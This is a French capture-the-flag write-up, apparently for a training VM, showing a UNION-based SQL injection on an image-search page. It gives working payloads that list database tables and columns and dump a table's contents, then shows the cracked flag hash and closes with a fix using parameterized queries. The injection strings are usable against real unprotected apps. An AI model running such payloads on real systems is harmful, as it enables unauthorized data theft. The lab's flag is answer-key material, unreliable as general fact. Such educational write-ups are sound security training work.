# Member SQL injection

Sur /index.php?page=searchimg, on peut rechercher les images par id. En testant on se rend compte que l'input n'est pas protégé et qu'on peut injecter du sql dans le where.
La requête SQL ressemble à ça: `SELECT title, url FROM list_images where id = $id`

### Récupération des tables

On reprend les même requêtes que pour les users et on commence par récupérer toute les tables présentes dans la database:
Input : `1 UNION SELECT 1, table_name FROM information_schema.tables`
Le `1,` ici permet simplement de récupérer autant de columns que dans le SELECT précédant (le SELECT du code d'index.php), c'est à dire 2 colonnes.
Output:
```
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
Title: Nsa
Url : https://www.nsa.org/img.jpg
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
Title: CHARACTER_SETS
Url : 1
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
Title: COLLATIONS
Url : 1
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables 
Title: COLLATION_CHARACTER_SET_APPLICABILITY
Url : 1

ETC...
```
Nous retrouvons le nom des tables dans la colonne `Title`
On remarque que la table `list_images` est présente, et nous allons nous conentrer dessus

### Récupération des colonnes de la table `list_images`

Il faut maintenant récupérer les colonnes de la table `list_images`:
Input: `1 union select table_name, column_name from information_schema.columns`
(Ici, pas besoin du `1,` car nous récupérons déjà 2 colonnes)
Output (avec un ctrl+f sur "users"):
```
ID: 1 union select table_name, column_name from information_schema.columns 
Title: id
Url : list_images
ID: 1 union select table_name, column_name from information_schema.columns 
Title: url
Url : list_images
ID: 1 union select table_name, column_name from information_schema.columns 
Title: title
Url : list_images
ID: 1 union select table_name, column_name from information_schema.columns 
Title: comment
Url : list_images
```
Pareil ici, on récupère toutes les colonnes de la table `list_images` dans `Title`.

### Récupération de toutes les infos utilisateurs

Il nous suffit maintenant de récupérer toute les données contenues dans la table `list_images`.
Comme nous récupérerons ici beaucoup de colonnes et que nous ne pouvons normalement qu'en récuperer que 2 avec le `UNION`, on doit utiliser un `concat()` pour concaténer la sortie de plusieurs colonnes en une seule. Pour la clareté, on ajouter un `\n`  entre chaque colonne:
Input: `1 union select null, concat(url, 0x0a, title, 0x0a, comment) from list_images`
Output:
```
ID: 1 union select null, concat(url, 0x0a, title, 0x0a, comment) from list_images 
Title: borntosec.ddns.net/images.png
Hack me ?
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url :

ID: 1 union select null, concat(url, 0x0a, title, 0x0a, comment) from list_images 
Title: https://www.h4x0r3.0rg/tr0ll.png
tr00l
Because why not ?
Url : 

ETC...
```

On remarque le commentaire de l'image qui a pour titre `Hack me ?`

Une fois reverse `1928e8083cf461a51303633093573c46`, nous donne `albatroz`
Il nous suffit de le lower puis de le sha256 : `sha256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

# Comment fix ?

Il faudra ici sanitize les inputs utilisateur au maximum, mais surtout utiliser les "requêtes paramétrées", gérées par le serveur, qui ajouteront les paramètres à l'execution des requêtes. Il sera alors impossible d'ajouter un bout de requêtes SQL, étéant donné que la requête préparée sera pré-compilée, et les paramètres, non.

